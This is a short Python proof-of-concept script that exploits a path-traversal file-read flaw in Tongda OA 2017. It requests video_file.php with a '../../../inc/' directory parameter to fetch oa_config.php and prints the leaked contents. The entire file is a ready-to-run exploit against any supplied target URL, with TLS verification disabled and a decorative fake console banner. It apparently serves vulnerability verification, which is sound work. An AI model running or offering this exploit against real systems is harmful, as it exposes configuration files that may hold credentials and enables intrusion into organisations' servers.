#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url =  site + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "ROOT_PATH" in r.text:
        return r.text[:500]
    return ""
    

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 tongda-v2017-video-file-file-read.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 path 结果为：", info)
    else:
        print("[-]漏洞不存在")
